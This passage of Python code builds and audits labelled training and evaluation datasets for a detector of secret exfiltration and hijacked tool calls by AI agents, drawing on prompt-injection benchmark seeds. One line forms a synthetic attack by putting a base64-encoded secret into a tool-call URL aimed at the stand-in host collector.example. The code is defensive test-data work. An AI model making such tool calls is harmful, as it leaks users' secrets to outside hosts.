        by_group.setdefault(g, []).append(rec)
        cat: ThreatCategory = (
            _map_benign_dev_category(rec.language_or_format, rec.tool_server, rec.tool_name)
            if rec.category == "BENIGN_DEV"
            else rec.category
        )
        cat_map = group_cat_counts.setdefault(g, {})
        cat_map[cat] = cat_map.get(cat, 0) + 1

    all_groups = sorted(by_group.keys())
    if len(all_groups) < 3:
        raise ValueError(
            f"Need >= 3 distinct repo_or_source groups for zero-overlap splits, got {len(all_groups)}"
        )

    groups_by_cat: dict[ThreatCategory, list[str]] = {c: [] for c in ALL_THREAT_CATEGORIES}
    for g in all_groups:
        counts = group_cat_counts[g]
        primary_cat = sorted(counts.items(), key=lambda kv: (-kv[1], kv[0]))[0][0]
        groups_by_cat[primary_cat].append(g)

    rng = random.Random(rng_seed)
    train_group_set: set[str] = set()
    val_group_set: set[str] = set()
    eval_dev_group_set: set[str] = set()
    leftover_groups: list[str] = []

    for cat in ALL_THREAT_CATEGORIES:
        cat_groups = list(groups_by_cat[cat])
        if not cat_groups:
            continue
        rng.shuffle(cat_groups)
        if len(cat_groups) >= 3:
            n_eval_cat = max(1, round(len(cat_groups) * 0.15))
            n_val_cat = max(1, round(len(cat_groups) * 0.15))
            if n_eval_cat + n_val_cat >= len(cat_groups):
                n_eval_cat = 1
                n_val_cat = 1
            eval_dev_group_set.update(cat_groups[:n_eval_cat])
            val_group_set.update(cat_groups[n_eval_cat : n_eval_cat + n_val_cat])
            train_group_set.update(cat_groups[n_eval_cat + n_val_cat :])
        else:
            leftover_groups.extend(cat_groups)

    for g in leftover_groups:
        if not eval_dev_group_set:
            eval_dev_group_set.add(g)
        elif not val_group_set:
            val_group_set.add(g)
        else:
            train_group_set.add(g)

    if not train_group_set and len(val_group_set) > 1:
        moved = sorted(val_group_set)[0]
        val_group_set.remove(moved)
        train_group_set.add(moved)

    sorted_train_groups = tuple(sorted(train_group_set))
    sorted_val_groups = tuple(sorted(val_group_set))
    sorted_eval_groups = tuple(sorted(eval_dev_group_set))

    return StratifiedSeedPartition(
        train_seeds=[s for g in sorted_train_groups for s in by_group[g]],
        val_seeds=[s for g in sorted_val_groups for s in by_group[g]],
        eval_dev_seeds=[s for g in sorted_eval_groups for s in by_group[g]],
        holdout_bench_seeds=holdout_bench_seeds,
        train_groups=sorted_train_groups,
        val_groups=sorted_val_groups,
        eval_dev_groups=sorted_eval_groups,
    )


def adapt_benchmark_holdout_seeds(
    holdout_seeds: Sequence[SeedRecord | dict[str, Any]],
    *,
    target_count: int,
    rng_seed: int = 42,
) -> list[JevTrainingPair]:
    """Convert held-out AgentDojo & MCPSecBench seeds into evaluation pairs with zero train leakage."""
    if not holdout_seeds or target_count <= 0:
        return []

    by_suite: dict[str, list[SeedRecord]] = {}
    for item in holdout_seeds:
        rec = item if isinstance(item, SeedRecord) else SeedRecord.model_validate(item)
        suite_key = rec.repo_or_source.split("/")[0].strip().lower() or "holdout"
        by_suite.setdefault(suite_key, []).append(rec)

    # Interleave benchmark suites (AgentDojo, MCPSecBench, ...) so every quota >= 2 covers all suites
    interleaved_seeds: list[SeedRecord] = []
    suite_keys = sorted(by_suite.keys())
    max_len = max(len(v) for v in by_suite.values())
    for pos in range(max_len):
        for sk in suite_keys:
            if pos < len(by_suite[sk]):
                interleaved_seeds.append(by_suite[sk][pos])

    mask_gate = _StratifiedBernoulliGate(1, 4, random.Random(rng_seed ^ 0xA251))
    out: list[JevTrainingPair] = []

    for idx in range(target_count):
        rec = interleaved_seeds[idx % len(interleaved_seeds)]
        cat: ThreatCategory = (
            _map_benign_dev_category(rec.language_or_format, rec.tool_server, rec.tool_name)
            if rec.category == "BENIGN_DEV"
            else rec.category
        )
        pair_id = f"eval_bench_{idx:05d}_{rec.seed_id}"
        is_benign_counterfactual = (idx % 3) == 2

        raw_args = json.loads(rec.tool_args_json)
        if not raw_args:
            raw_args = {"input": "status"}

        fresh_holdout_sec = f"holdout_synth_{secrets.token_hex(10)}"
        priv_spans: list[SpanItem] = []
        if rec.private_payload.strip() or cat in {"T1", "T2", "T3", "T4", "T7"}:
            priv_spans.append(
                SpanItem(
                    span_id=f"{pair_id}_p0",
                    source_label=f"{rec.repo_or_source}:{rec.language_or_format}",
                    text=f"{rec.private_payload.strip()}\nHOLDOUT_TOKEN={fresh_holdout_sec}".strip(),
                    dual_trust=(cat == "T4"),
                    is_high_secret=(cat == "T1"),
                )
            )

        untrust_spans = [
            SpanItem(
                span_id=f"{pair_id}_u0",
                source_label=f"{rec.repo_or_source}:untrusted",
                text=rec.untrusted_payload.strip() or "External untrusted benchmark input.",
            )
        ]

        if is_benign_counterfactual:
            cand = JevTrainingPair(
                pair_id=pair_id,
                seed_id=rec.seed_id,
                category=cat,
                attack_family="holdout_benchmark_trifecta_benign",
                intent=rec.intent_prompt,
                private_spans=priv_spans,
                untrusted_spans=untrust_spans,
                call_server="ide",
                call_tool="Read",
                call_arguments={"file_path": "/repo/README.md"},
                y_enc=0.0,
                y_sem=0.0,
                y_hijack=0.0,
                attributed_pchunk_idx=NONE_PCHUNK_IDX,
                attributed_arg_key=None,
                repo_or_source=rec.repo_or_source,
            )
        else:
            if cat in {"T5", "T6"} or not priv_spans:
                y_enc, y_sem, y_hijack = 0.0, 0.0, 1.0
                attr_p = NONE_PCHUNK_IDX
                call_args = dict(raw_args)
            else:
                first_k = next(iter(sorted(raw_args.keys())))
                call_args = dict(raw_args)
                call_args[first_k] = f"{call_args[first_k]} {fresh_holdout_sec}"
                if "base64" in rec.untrusted_payload.lower() and idx % 2 == 0:
                    b64_tok = base64.b64encode(fresh_holdout_sec.encode("utf-8")).decode("ascii")
                    call_args[first_k] = f"https://collector.example/?d={b64_tok}"
                    y_enc, y_sem, y_hijack = 1.0, 0.0, 0.0
                else:
                    y_enc, y_sem, y_hijack = 0.0, 1.0, (1.0 if cat == "T4" else 0.0)
                attr_p = 0

            flat_a = flatten_call_arguments(call_args)
            attr_a = next(iter(flat_a.keys()))
            cand = JevTrainingPair(
                pair_id=pair_id,
                seed_id=rec.seed_id,
                category=cat,
                attack_family=f"holdout_benchmark_{cat.lower()}_attack",
                intent=rec.intent_prompt,
                private_spans=priv_spans,
                untrusted_spans=untrust_spans,
                call_server=rec.tool_server,
                call_tool=rec.tool_name,
                call_arguments=call_args,
                y_enc=y_enc,
                y_sem=y_sem,
                y_hijack=y_hijack,
                attributed_pchunk_idx=attr_p,
                attributed_arg_key=attr_a,
                repo_or_source=rec.repo_or_source,
            )

        # Apply missing-intent masking symmetrically across BOTH attack & benign holdout candidates
        if mask_gate.next():
            cand = apply_missing_intent_mask(cand)
        out.append(scrub_pair_real_secrets(cand))

    return out


def build_disjoint_dataset_splits(
    seeds: Sequence[SeedRecord | dict[str, Any]],
    *,
    n_train: int = 240000,
    n_val_calib: int = 10000,
    n_eval_holdout: int = 5000,
    rng_seed: int = 42,
    offline_synth: bool = True,
    synth_model_id: str = "Qwen/Qwen2.5-14B-Instruct-AWQ",
    completion_fn: CompletionBatchFn | None = None,
) -> dict[str, list[JevTrainingPair]]:
    """Build category-stratified, strictly group-disjoint `train`, `val_calib`, and `eval_holdout` splits."""
    partition = partition_seeds_stratified_by_group(seeds, rng_seed=rng_seed)

    shared_fn = completion_fn
    if not offline_synth and shared_fn is None and (n_train + n_val_calib + n_eval_holdout) > 0:
        shared_fn = get_or_create_vllm_completion_fn(model_id=synth_model_id)

    def _synthesize_mix(
        pool: list[SeedRecord],
        total: int,
        sub_seed: int,
        prefix: str,
    ) -> list[JevTrainingPair]:
        if total <= 0:
            return []
        n_prog = round(total * 0.34)
        if total >= 2:
            n_prog = min(max(1, n_prog), total - 1)
        n_vllm = total - n_prog

        prog_rows = list(
            generate_programmatic_pairs(pool, n_samples=n_prog, rng_seed=sub_seed ^ 0x101)
        )
        vllm_rows = list(
            iter_matched_vllm_pairs(
                pool,
                n_samples=n_vllm,
                rng_seed=sub_seed ^ 0x202,
                offline=offline_synth,
                model_id=synth_model_id,
                completion_fn=shared_fn,
            )
        )
        combined: list[JevTrainingPair] = []
        for idx, p in enumerate([*prog_rows, *vllm_rows]):
            combined.append(p.model_copy(update={"pair_id": f"{prefix}_{idx:06d}_{p.category.lower()}"}))
        return combined

    train_pairs = _synthesize_mix(partition.train_seeds, n_train, rng_seed ^ 0x1111, "train")
    val_pairs = _synthesize_mix(partition.val_seeds, n_val_calib, rng_seed ^ 0x2222, "val")

    if not partition.holdout_bench_seeds or n_eval_holdout <= 0:
        bench_quota = 0
    elif n_eval_holdout <= 4:
        bench_quota = max(1, n_eval_holdout // 2)
    else:
        bench_quota = max(2, min(round(n_eval_holdout * 0.40), n_eval_holdout - 1))

    bench_eval_pairs = adapt_benchmark_holdout_seeds(
        partition.holdout_bench_seeds,
        target_count=bench_quota,
        rng_seed=rng_seed ^ 0x3333,
    )
    dev_eval_pairs = _synthesize_mix(
        partition.eval_dev_seeds,
        n_eval_holdout - len(bench_eval_pairs),
        rng_seed ^ 0x4444,
        "eval_trifecta",
    )
    eval_pairs = [*bench_eval_pairs, *dev_eval_pairs]

    return {
        "train": train_pairs,
        "val_calib": val_pairs,
        "eval_holdout": eval_pairs,
    }


def _row_to_parquet_dict(pair: JevTrainingPair, packed: PackedJevRow, split_name: str) -> dict[str, Any]:
    is_trifecta_benign = bool(
        pair.private_spans
        and (pair.untrusted_spans or any(sp.dual_trust for sp in pair.private_spans))
        and max(packed.y_enc, packed.y_sem, packed.y_hijack) < 0.5
    )
    return {
        "pair_id": pair.pair_id,
        "seed_id": pair.seed_id,
        "repo_or_source": pair.repo_or_source,
        "group_key": compute_group_key(pair.repo_or_source, pair.seed_id),
        "split": split_name,
        "category": pair.category,
        "attack_family": pair.attack_family,
        "flipjev_applied": pair.flipjev_applied,
        "intent_masked": pair.intent_masked,
        "is_trifecta_benign": is_trifecta_benign,
        "bucket_length": packed.bucket_length,
        "unpadded_length": packed.unpadded_length,
        "none_position": packed.none_position,
        "was_truncated": packed.was_truncated,
        "input_ids": packed.input_ids,
        "seg_ids": packed.seg_ids,
        "token_roles": packed.token_roles,
        "query_positions": packed.query_positions,
        "pchunk_positions": packed.pchunk_positions,
        "pchunk_valid_mask": packed.pchunk_valid_mask,
        "arg_positions": packed.arg_positions,
        "arg_valid_mask": packed.arg_valid_mask,
        "y_enc": packed.y_enc,
        "y_sem": packed.y_sem,
        "y_hijack": packed.y_hijack,
        "target_src_idx": packed.target_src_idx,
        "target_arg_idx": packed.target_arg_idx,
    }


PACKED_PARQUET_SCHEMA = pa.schema(
    [
        ("pair_id", pa.string()),
        ("seed_id", pa.string()),
        ("repo_or_source", pa.string()),
        ("group_key", pa.string()),
        ("split", pa.string()),
        ("category", pa.string()),
        ("attack_family", pa.string()),
        ("flipjev_applied", pa.bool_()),
        ("intent_masked", pa.bool_()),
        ("is_trifecta_benign", pa.bool_()),
        ("bucket_length", pa.int64()),
        ("unpadded_length", pa.int64()),
        ("none_position", pa.int64()),
        ("was_truncated", pa.bool_()),
        ("input_ids", pa.list_(pa.int64())),
        ("seg_ids", pa.list_(pa.int64())),
        ("token_roles", pa.list_(pa.int64())),
        ("query_positions", pa.list_(pa.int64())),
        ("pchunk_positions", pa.list_(pa.int64())),
        ("pchunk_valid_mask", pa.list_(pa.bool_())),
        ("arg_positions", pa.list_(pa.int64())),
        ("arg_valid_mask", pa.list_(pa.bool_())),
        ("y_enc", pa.float32()),
        ("y_sem", pa.float32()),
        ("y_hijack", pa.float32()),
        ("target_src_idx", pa.int64()),
        ("target_arg_idx", pa.int64()),
    ]
)


def pack_dataset_to_parquet(
    splits: Mapping[str, Iterable[JevTrainingPair]],
    tokenizer: Any,
    manifest: BundleManifest,
    out_dir: Path,
    *,
    max_bucket: int = 4096,
    pad_to_max_bucket: bool = False,
    batch_size: int = 10_000,
) -> dict[str, Path]:
    """Stream-pack `train`, `val_calib` (`diodebench_mcp_250k`) & `eval_holdout` (`trifecta_dev_bench_5k`) to Parquet."""
    if batch_size < 1:
        raise ValueError(f"batch_size must be >= 1, got {batch_size}")

    out_dir = Path(out_dir)
    out_dir.mkdir(parents=True, exist_ok=True)
    packer = JevDatasetPacker(tokenizer, manifest)

    file_names = {
        "train": "diodebench_mcp_250k_train.parquet",
        "val_calib": "diodebench_mcp_250k_val_calib.parquet",
        "eval_holdout": "trifecta_dev_bench_5k_eval.parquet",
    }
    written: dict[str, Path] = {}

    for split_name, pairs in splits.items():
        target_file = out_dir / file_names.get(split_name, f"{split_name}.parquet")
        batch_rows: list[dict[str, Any]] = []
        wrote_any_batch = False

        with pq.ParquetWriter(str(target_file), PACKED_PARQUET_SCHEMA) as writer:
            for pair in pairs:
                packed = packer.pack_pair(
                    pair, max_bucket=max_bucket, pad_to_max_bucket=pad_to_max_bucket
                )
                batch_rows.append(_row_to_parquet_dict(pair, packed, split_name))
                if len(batch_rows) >= batch_size:
                    writer.write_table(pa.Table.from_pylist(batch_rows, schema=PACKED_PARQUET_SCHEMA))
                    batch_rows.clear()
                    wrote_any_batch = True

            if batch_rows or not wrote_any_batch:
                writer.write_table(pa.Table.from_pylist(batch_rows, schema=PACKED_PARQUET_SCHEMA))
                batch_rows.clear()

        written[split_name] = target_file

    return written


@dataclass(frozen=True)
class AuditReport:
    """Zero-leakage and tensor-invariant audit report."""

    total_packed_rows: int
    leakage_count: int
    real_secret_hits: int
    split_counts: dict[str, int]
    violations: tuple[str, ...]


def audit_packed_splits(
    splits: Mapping[str, Sequence[JevTrainingPair]],
    parquet_paths: Mapping[str, Path] | None = None,
) -> AuditReport:
    """Verify 0 repo/seed/benchmark/secret leakage across splits and 100% valid packed Parquet tensors."""
    violations: list[str] = []
    real_secret_hits = 0

    group_sets: dict[str, set[str]] = {}
    seed_sets: dict[str, set[str]] = {}
    secret_sets: dict[str, set[str]] = {}
    split_counts: dict[str, int] = {}

    for split_name, pairs in splits.items():
        split_counts[split_name] = len(pairs)
        g_set: set[str] = set()
        s_set: set[str] = set()
        sec_set: set[str] = set()

        for p in pairs:
            g_key = compute_group_key(p.repo_or_source, p.seed_id)
            g_set.add(g_key)
            s_set.add(p.seed_id)

            if split_name in {"train", "val_calib"} and is_holdout_benchmark_source(
                f"{p.seed_id} {p.repo_or_source}"
            ):
                violations.append(
                    f"Holdout benchmark row {p.seed_id!r} ({p.repo_or_source!r}) leaked into {split_name}"
                )

            dumped = p.model_dump_json()
            real_hits = _REAL_SECRET_AUDIT_RE.findall(dumped)
            if real_hits:
                real_secret_hits += len(real_hits)
                violations.append(
                    f"Real secret pattern {real_hits[0]!r} detected in {split_name}:{p.pair_id}"
                )

            for sec_tok in _SYNTH_SECRET_AUDIT_RE.findall(dumped):
                sec_set.add(sec_tok)

        group_sets[split_name] = g_set
        seed_sets[split_name] = s_set
        secret_sets[split_name] = sec_set

    split_names = sorted(splits.keys())
    for i, sp_a in enumerate(split_names):
        for sp_b in split_names[i + 1 :]:
            g_overlap = group_sets[sp_a] & group_sets[sp_b]
            if g_overlap:
                violations.append(
                    f"Group overlap between {sp_a} and {sp_b}: {sorted(g_overlap)[:5]}"
                )
            s_overlap = seed_sets[sp_a] & seed_sets[sp_b]
            if s_overlap:
                violations.append(
                    f"Seed ID overlap between {sp_a} and {sp_b}: {sorted(s_overlap)[:5]}"
                )
            sec_overlap = secret_sets[sp_a] & secret_sets[sp_b]
            if sec_overlap:
                violations.append(
                    f"Synthetic secret overlap between {sp_a} and {sp_b}: {sorted(sec_overlap)[:3]}"
                )

    total_packed_rows = sum(split_counts.values())
    if parquet_paths is not None:
        pq_total = 0
        allowed_buckets = set(DEFAULT_LENGTH_BUCKETS)
        for split_name, pq_path in parquet_paths.items():
            tbl = pq.read_table(pq_path)
            pq_rows = tbl.to_pylist()
            pq_total += len(pq_rows)
            for r in pq_rows:
                b_len = int(r["bucket_length"])
                if b_len not in allowed_buckets:
                    violations.append(f"Invalid bucket_length={b_len} in {split_name}")
                if (
                    len(r["input_ids"]) != b_len
                    or len(r["seg_ids"]) != b_len
                    or len(r["token_roles"]) != b_len
                ):
                    violations.append(f"Sequence length mismatch in {split_name}:{r['pair_id']}")
                t_src = int(r["target_src_idx"])
                t_arg = int(r["target_arg_idx"])
                if not (0 <= t_src <= 32) or not r["pchunk_valid_mask"][t_src]:
                    violations.append(f"Invalid target_src_idx={t_src} on {r['pair_id']}")
                if not (0 <= t_arg <= 16) or not r["arg_valid_mask"][t_arg]:
                    violations.append(f"Invalid target_arg_idx={t_arg} on {r['pair_id']}")

                row_y_enc = float(r["y_enc"])
                row_y_sem = float(r["y_sem"])
                row_y_hijack = float(r["y_hijack"])
                if max(row_y_enc, row_y_sem) >= 0.5 and t_src >= 32:
                    violations.append(
                        f"Contradictory leak supervision (y_enc={row_y_enc}, y_sem={row_y_sem}) with target_src_idx={t_src} on {r['pair_id']}"
                    )
                if max(row_y_enc, row_y_sem) < 0.5 and t_src != 32:
                    violations.append(
                        f"Non-leak row must point target_src_idx=32, got {t_src} on {r['pair_id']}"
                    )
                if max(row_y_enc, row_y_sem, row_y_hijack) >= 0.5 and t_arg >= 16:
                    violations.append(
                        f"Contradictory attack supervision with target_arg_idx={t_arg} on {r['pair_id']}"
                    )
                if max(row_y_enc, row_y_sem, row_y_hijack) < 0.5 and t_arg != 16:
                    violations.append(
                        f"Benign row must point target_arg_idx=16, got {t_arg} on {r['pair_id']}"
                    )

                for qp in r["query_positions"]:
                    if r["token_roles"][qp] != ROLE_QUERY or r["seg_ids"][qp] != 5:
                        violations.append(f"Query role/seg invariant broken on {r['pair_id']}")
        total_packed_rows = pq_total

    leakage_count = len(violations)
    report = AuditReport(
        total_packed_rows=total_packed_rows,
        leakage_count=leakage_count,
        real_secret_hits=real_secret_hits,
        split_counts=split_counts,
        violations=tuple(violations),
    )
    if leakage_count > 0 or real_secret_hits > 0:
        raise DatasetLeakageError("; ".join(violations))
    return report


def _build_offline_backbone_test_tokenizers(root_dir: Path) -> list[tuple[str, Tokenizer, BundleManifest]]:
    """Build 3 fast offline local tokenizers representing `base`, `large`, and `nanojev` for `--dry-run`."""
    profiles: list[tuple[str, Tokenizer, BundleManifest]] = []

    wp_vocab = {
        "[PAD]": 0,
        "[UNK]": 1,
        "[CLS]": 2,
        "[SEP]": 3,
        "check": 4,
        "open": 5,
        "issue": 6,
        "stripe": 7,
        "secret": 8,
        "<": 9,
        "|": 10,
        ">": 11,
        "[": 12,
        "]": 13,
        "\\": 14,
        "=": 15,
        ".": 16,
    }
    for alias in ("base", "large"):
        src_dir = root_dir / f"src_{alias}"
        out_dir = root_dir / f"jev_{alias}"
        src_dir.mkdir(parents=True, exist_ok=True)
        wp_tok = Tokenizer(models.WordPiece(vocab=wp_vocab, unk_token="[UNK]"))
        wp_tok.normalizer = normalizers.BertNormalizer(lowercase=True)
        wp_tok.pre_tokenizer = pre_tokenizers.BertPreTokenizer()
        fast_wp = PreTrainedTokenizerFast(
            tokenizer_object=wp_tok,
            unk_token="[UNK]",
            pad_token="[PAD]",
            cls_token="[CLS]",
            sep_token="[SEP]",
        )
        fast_wp.save_pretrained(str(src_dir))
        sp_ids = build_jev_tokenizer(str(src_dir), out_dir)
        rust_tok = Tokenizer.from_file(str(out_dir / "tokenizer.json"))
        manifest = BundleManifest(
            model_id=f"diodemcp-jev-{alias}-int8",
            sha256_model_onnx="0" * 64,
            sha256_tokenizer_json="1" * 64,
            sha256_calibration_json="2" * 64,
            special_token_ids=sp_ids,
            ece_val=0.015,
        )
        profiles.append((alias, rust_tok, manifest))

    bpe_vocab = {
        "<|endoftext|>": 0,
        "<": 1,
        "|": 2,
        ">": 3,
        "[": 4,
        "]": 5,
        "\\": 6,
        "C": 7,
        "L": 8,
        "S": 9,
        "E": 10,
        "P": 11,
        "A": 12,
        "D": 13,
        "i": 14,
        "n": 15,
        "t": 16,
        "e": 17,
        "_": 18,
        "=": 19,
        ".": 20,
        " ": 21,
    }
    bpe_src = root_dir / "src_nanojev"
    bpe_out = root_dir / "jev_nanojev"
    bpe_src.mkdir(parents=True, exist_ok=True)
    bpe_tok = Tokenizer(models.BPE(vocab=bpe_vocab, merges=[]))
    bpe_tok.pre_tokenizer = pre_tokenizers.ByteLevel(add_prefix_space=False)
    fast_bpe = PreTrainedTokenizerFast(
        tokenizer_object=bpe_tok,
        eos_token="<|endoftext|>",
        bos_token="<|endoftext|>",
        unk_token="<|endoftext|>",
        pad_token="<|endoftext|>",
    )
    fast_bpe.save_pretrained(str(bpe_src))
    nano_sp = build_jev_tokenizer(str(bpe_src), bpe_out)
    nano_rust = Tokenizer.from_file(str(bpe_out / "tokenizer.json"))
    nano_manifest = BundleManifest(
        model_id="diodemcp-nanojev-0.6b",
        sha256_model_onnx="3" * 64,
        sha256_tokenizer_json="4" * 64,
        sha256_calibration_json="5" * 64,
        special_token_ids=nano_sp,
        ece_val=0.020,
    )
    profiles.append(("nanojev", nano_rust, nano_manifest))
    return profiles


def run_dry_run() -> AuditReport:
    """Execute deterministic 32-row dry-run across all 3 backbone tokenizer profiles and verify 0 leakage."""
    with tempfile.TemporaryDirectory(prefix="diodemodel_dryrun_") as tmp_str:
        tmp_dir = Path(tmp_str)
        seeds_pq = tmp_dir / "permissive_seeds.parquet"
        load_permissive_seeds(seeds_pq, include_remote=False)
        all_seeds = [SeedRecord.model_validate(r) for r in pq.read_table(seeds_pq).to_pylist()]

        # 20 train + 4 val_calib + 8 eval_holdout = 32 packed rows
        splits = build_disjoint_dataset_splits(
            all_seeds,
            n_train=20,
            n_val_calib=4,
            n_eval_holdout=8,
            rng_seed=42,
            offline_synth=True,
        )

        profiles = _build_offline_backbone_test_tokenizers(tmp_dir / "toks")
        last_report: AuditReport | None = None
        for alias, tok, manifest in profiles:
            pq_paths = pack_dataset_to_parquet(
                splits=splits,
                tokenizer=tok,
                manifest=manifest,
                out_dir=tmp_dir / f"packed_{alias}",
                max_bucket=1024,
            )
            last_report = audit_packed_splits(splits, pq_paths)

        if last_report is None:
            raise RuntimeError("Dry run produced no audit report")
        if last_report.total_packed_rows != 32 or last_report.leakage_count != 0:
            raise RuntimeError(
                f"Dry run audit mismatch: rows={last_report.total_packed_rows}, leakage={last_report.leakage_count}"
            )
        return last_report


def main(argv: Sequence[str] | None = None) -> int:
    parser = argparse.ArgumentParser(
        description="Pack DiodeBench-MCP-250k & Trifecta-Dev-Bench-5k Parquet datasets and audit zero leakage"
    )
    parser.add_argument("--dry-run", action="store_true", help="Run 32-row offline smoke & leakage test")
    parser.add_argument("--seeds-parquet", type=Path, default=None)
    parser.add_argument("--tokenizer-dir", type=Path, default=None)
    parser.add_argument("--out-dir", type=Path, default=None)
    parser.add_argument("--n-train", type=int, default=240000)
    parser.add_argument("--n-val-calib", type=int, default=10000)
    parser.add_argument("--n-eval-holdout", type=int, default=5000)
    parser.add_argument("--max-bucket", type=int, default=4096)
    parser.add_argument("--offline-synth", action="store_true")
    parser.add_argument("--seed", type=int, default=42)
    args = parser.parse_args(list(argv) if argv is not None else None)

    if args.dry_run:
        report = run_dry_run()
        print(f"Dry run OK: {report.total_packed_rows} packed rows, {report.leakage_count} leakage")
        return 0

    if args.seeds_parquet is None or args.out_dir is None:
        parser.error("--seeds-parquet and --out-dir are required unless --dry-run is set")

    all_seeds = [
        SeedRecord.model_validate(r) for r in pq.read_table(args.seeds_parquet).to_pylist()
    ]
    splits = build_disjoint_dataset_splits(
        all_seeds,
        n_train=args.n_train,
        n_val_calib=args.n_val_calib,
        n_eval_holdout=args.n_eval_holdout,
        rng_seed=args.seed,
        offline_synth=args.offline_synth,
    )

    if args.tokenizer_dir is not None:
        tok_file = args.tokenizer_dir / "tokenizer.json"
        tok = Tokenizer.from_file(str(tok_file))
        sp_ids = {s: int(tok.token_to_id(s)) for s in REQUIRED_SPECIAL_TOKENS}
        manifest = BundleManifest(
            model_id="diodemcp-jev-base-int8",
            sha256_model_onnx="0" * 64,
            sha256_tokenizer_json="1" * 64,
            sha256_calibration_json="2" * 64,
            special_token_ids=sp_ids,
            ece_val=0.015,
        )
    else:
        tok, manifest = load_golden_test_tokenizer_and_manifest()

    pq_paths = pack_dataset_to_parquet(
        splits=splits,
        tokenizer=tok,
        manifest=manifest,
        out_dir=args.out_dir,
        max_bucket=args.max_bucket,
    )
    report = audit_packed_splits(splits, pq_paths)
    print(
        f"Packed {report.total_packed_rows} rows -> {args.out_dir} ({report.leakage_count} leakage)"
    )
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
